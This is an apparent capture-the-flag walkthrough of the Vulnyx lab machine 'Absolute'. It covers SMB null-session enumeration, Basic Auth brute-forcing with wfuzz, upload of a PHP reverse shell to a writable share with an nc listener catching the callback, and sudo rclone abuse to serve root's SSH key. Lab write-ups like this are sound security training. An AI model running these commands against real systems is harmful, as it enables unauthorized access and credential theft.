# Vulnyx: Absolute

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `rpcclient` · `wfuzz` · `nxc` · `smbclient` · `nc` |
| **Tags** | `#SMB` `#FileUpload` `#RCE` `#BruteForce` `#SudoAbuse` `#InfoDisclosure` |
| **URL** | https://vulnyx.com/machines/ |

An SMB share named `web`, reachable with a null session, turns out to be writable and backs the site's actual document root — uploading a PHP reverse shell there and requesting it through a Basic Auth-protected path (cracked with `wfuzz`) gives RCE. From there, a `sudo` rule around `rclone` is abused to serve `/root/.ssh` over plain HTTP, handing over root's private key directly.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn absolute.nyx

PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 08:00:27:6D:8A:B7 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **80 (HTTP)** and **139/445 (SMB)** — and notably no SSH. A version/script scan against them fills in the details:

```bash
$ sudo nmap -p 80,139,445 -sCV absolute.nyx

PORT    STATE SERVICE     VERSION
80/tcp  open  http        nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:6D:8A:B7 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb2-time:
|   date: 2026-08-28T12:51:02
|   start_date: N/A
|_smb2-security-mode:
    3.1.1:
      Message signing enabled but not required
|_nbstat: NetBIOS name: ABSOLUTE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

### Web Enumeration

```
http://absolute.nyx/
```

<img src="../Images/absolute/Pasted image 20260828151946.png"/>

A content scan finds nothing beyond the default nginx page for now:

```bash
$ ffuf -u http://absolute.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic -fs 153

index.html              [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 2ms]
                        [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 9ms]
                        [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 9ms]
```

### SMB Share Enumeration

A null RPC session (no credentials) lists the shares directly — the `web` share advertises the site's document root path in its comment:

```bash
$ rpcclient -N -U "" absolute.nyx -c netshareenum
netname: web
  remark: Website Directory
  path: C:\var\www\html\Uploaded-Backup-Files
  password:
```

## Initial Access

### Loot: An Auth-Protected Backup Directory

The path from the share comment (`Uploaded-Backup-Files`) maps to a web directory, but it's behind HTTP Basic Auth:

```
http://absolute.nyx/Uploaded-Backup-Files/
```

<img src="../Images/absolute/Pasted image 20260828152043.png"/>

The `WWW-Authenticate` header leaks a username in its realm string — a small info disclosure that turns a full credential brute force into a targeted password-only one:

```bash
$ curl -I 'http://absolute.nyx/Uploaded-Backup-Files/'
HTTP/1.1 401 Unauthorized
Server: nginx/1.22.1
Date: Fri, 28 Aug 2026 12:55:59 GMT
Content-Type: text/html
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Welcome to m.howard server!"
```

> **Username:** `m.howard`

`wfuzz` brute-forces the Basic Auth password, hiding the 179-char "unauthorized" response (`-hh 179`) so only a successful login stands out:

```bash
$ wfuzz -c -w /usr/share/wordlists/rockyou.txt --basic "m.howard:FUZZ" -u "http://absolute.nyx/Uploaded-Backup-Files/" -hh 179

************************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                            *
************************************************************

Target: http://absolute.nyx/Uploaded-Backup-Files/
Total requests: 14344392

ID      Response  Lines   Word    Chars   Payload

000000406:  200      45 L    92 W    935 Ch   "slideshow"
```

> **Credentials:** `m.howard:slideshow`

<img src="../Images/absolute/Pasted image 20260828152225.png"/>

### Writable SMB Share → Web Root

Listing the shares with a null session over SMB shows `web` is not just readable but writable:

```bash
$ nxc smb absolute.nyx -u '' -p '' --shares
SMB         <IP_Victim>    445    ABSOLUTE    [+] Unix - Samba (name:ABSOLUTE) (domain:ABSOLUTE) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         <IP_Victim>    445    ABSOLUTE    [+] ABSOLUTE\:
SMB         <IP_Victim>    445    ABSOLUTE    [+] Enumerated shares
SMB         <IP_Victim>    445    ABSOLUTE
                Share          Permissions   Remark
                -----          -----------   ------
                print$                        Printer Drivers
                web            READ,WRITE    Website Directory
                IPC$                         IPC_Service (Samba 4.17.12-Debian)
```

Connecting to the share and pulling `index.html` down, then comparing it against the live site, confirms this share *is* the web root — so a PHP file written here becomes immediately reachable over HTTP, behind the same Basic Auth path found earlier:

```bash
$ smbclient -N //absolute.nyx/web
Try "help" to get a list of possible commands.
smb: \> dir
                                    D        0  Fri Aug 28 08:52:29 2026
                                    D        0  Fri Jul 11 06:22:06 2025
  index.html                        N      935  Fri Jul 11 06:37:58 2025

            19480400 blocks of size 1024. 16165672 blocks available

smb: \> get index.html
getting file \index.html of size 935 as index.html (114.1 KiloBytes/sec) (average 114.1 KiloBytes/sec)
smb: \> put rev_shell.php
putting file rev_shell.php as \rev_shell.php (93.5 KB/s) (average 93.5 KB/s)
```

### Shell as www-data

Requesting the uploaded shell through the authenticated path triggers it:

```bash
$ curl 'http://absolute.nyx/Uploaded-Backup-Files/rev_shell.php' -u 'm.howard:slideshow'
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [absolute.nyx] 52422
Linux absolute 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64 GNU/Linux
15:01:39 up 1:08, 0 users, load average: 0.01, 0.24, 0.23

USER     TTY      FROM             LOGIN@  IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (388): Inappropriate ioctl for device
bash: no job control in this shell
www-data@absolute:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Privilege Escalation

### Serving `/root/.ssh` via `rclone`

```bash
www-data@absolute:/$ sudo -l
Matching Defaults entries for www-data on absolute:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/sbin:/bin,
    use_pty

User www-data may run the following commands on absolute:
    (root) NOPASSWD: /usr/bin/rclone
```

`rclone` — a tool for syncing files to and from cloud storage — includes a `serve http` mode that turns any local directory into a browsable, unauthenticated HTTP server. Run as root via `sudo` and pointed at `/root/.ssh`, it exposes root's own SSH files over HTTP, sidestepping the file permissions that would normally keep `www-data` out:

```bash
www-data@absolute:/$ sudo -u root /usr/bin/rclone serve http /root/.ssh --addr 0.0.0.0:9005
```

<img src="../Images/absolute/Pasted image 20260828152448.png"/>

Browsing the served directory lists root's SSH files, private key included:

```bash
$ curl -sX GET 'http://absolute.nyx:9005' | html2text
****** / ******

Name                Size  Modified
Go up
authorized_keys     564   2025-07-11 10:40:42.167980107 +0000 UTC
id_rsa             2590   2025-07-11 10:40:42.167980107 +0000 UTC
```

```
http://absolute.nyx:9005/id_rsa
```

<img src="../Images/absolute/Pasted image 20260828152534.png"/>

The port scan showed no SSH exposed externally, but the daemon still listens on localhost — so the recovered key is used to SSH in as root over `127.0.0.1` from the existing `www-data` shell:

```bash
www-data@absolute:/tmp$ chmod 600 root_rsa
www-data@absolute:/tmp$ ssh -i root_rsa root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:4KGG5c0oerB3Xgd6nT2Q3J+j/dQR+6rQZf20TlK/U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
root@absolute:~# id
uid=0(root) gid=0(root) groups=0(root)
root@absolute:~# ls -l /root
total 4
-r--------  1 root root 33 Jul 11  2025 root.txt
root@absolute:~# cat /root/root.txt
9eed0f832d36e8a764f80618241a0210
```

> **Root flag:** `9eed0f832d36e8a764f80618241a0210`

## Finding the User Flag

With root already reached, the user flag is located afterward rather than along the way — it doesn't sit in a typical `/home/<user>/` path, consistent with this being a web-focused box:

```bash
root@absolute:~# find / -name user.txt 2>/dev/null
/var/www/user.txt
root@absolute:~# cat /var/www/user.txt
97d2920c0e8a20fe968827772a12b9e2
```

> **User flag:** `97d2920c0e8a20fe968827772a12b9e2`

## Takeaways

- A share named suggestively (`web`) is worth checking directly against the live site's content — if they match, the share is effectively the same attack surface as the web root, and SMB write access becomes a direct upload path.
- Basic Auth realms and headers sometimes leak more than intended — a username surfaced from the `WWW-Authenticate` header here turned a full credential brute force into a targeted, password-only one.
- `rclone serve http` (or any similar "expose this directory over HTTP" feature) run as root via `sudo` is a direct file-disclosure primitive — it doesn't need a separate vulnerability, just a directory worth reading, and it neatly bypasses the filesystem permissions protecting `/root/.ssh`.
- A service missing from an external port scan isn't necessarily absent — SSH here was bound to localhost only, still perfectly usable for a root login once the key was in hand and a foothold existed on the box.